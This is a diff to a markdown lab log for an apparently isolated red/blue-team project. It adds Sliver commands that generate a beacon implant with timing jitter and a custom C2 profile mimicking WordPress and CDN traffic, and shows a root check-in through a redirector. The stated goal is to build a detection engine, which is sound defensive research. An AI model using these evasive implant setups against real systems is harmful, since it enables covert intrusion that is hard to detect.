@@ -269,11 +269,52 @@ This confirmed the full offensive chain, now including the redirector:
 
 The real C2 server is no longer directly reachable from the target container.
 
+## Beacon Jitter and Malleable C2 Profile
+
+### Jitter
+
+The beacon was regenerated with explicit timing parameters, rather than relying on Sliver's defaults:
+
+    generate beacon --http redirector:8888 --os linux --arch arm64 --skip-symbols --seconds 45 --jitter 20 --save /root/
+
+This configures a check-in interval of ~45 seconds, varying by up to 20 seconds in either direction (roughly 25s to 65s between check-ins), making the traffic's timing pattern less predictable than a fixed interval.
+
+### Malleable C2 Profile
+
+Sliver's default C2 profile already disguises traffic reasonably well out of the box, using realistic-looking cookies (`JSESSIONID`, `cartId`, `authToken`) and common static asset paths. To go further, a custom profile named `glasshouse` was generated from a curated list of real-world-style URLs:
+
+    /wp-content/themes/twentytwentyone/assets/js/main.js
+    /wp-includes/js/jquery/jquery.min.js
+    /assets/bundles/app.bundle.js
+    /static/js/vendor/bootstrap.min.js
+    /js/scripts/analytics.js
+    /api/v1/health
+    /api/v1/status
+    /cdn-cgi/scripts/apps.js
+
+    c2profiles generate --file /root/urls.txt --name glasshouse --import
+
+Sliver extracted the common path and filename patterns from this list, producing a profile whose traffic resembles a WordPress site or CDN serving JavaScript assets, rather than generic C2 traffic.
+
+### Final Beacon
+
+The final beacon combines all of the project's offensive components: traffic routed through the redirector, randomized check-in timing, and the custom traffic profile.
+
+    generate beacon --http redirector:8888 --os linux --arch arm64 --skip-symbols --seconds 45 --jitter 20 --c2profile glasshouse --save /root/
+
+Verified check-in:
+
+    [server] sliver > beacons
+
+    ID         Name               Transport   Hostname   Username   Operating System
+    3bb34090   GORGEOUS_ABDOMEN   http(s)     target     root       linux/arm64
+
 ## Status
 
 - Sliver C2 server running in an isolated container.
 - HTTP listener active on port 8888.
 - Redirector in place, decoupling the target from the real C2 server.
-- Beacon implant successfully checking in through the full chain: target -> redirector -> C2.
+- Beacon configured with jitter (45s ± 20s) and a custom malleable C2 profile mimicking legitimate web traffic.
+- Full offensive chain validated end-to-end: target -> redirector -> C2, with evasive timing and traffic disguise.
 
-Next: configure beacon jitter and a malleable C2 profile, then begin building the detection engine.
+Next: capture this beacon's traffic and begin building the statistical detection engine (blue team side).
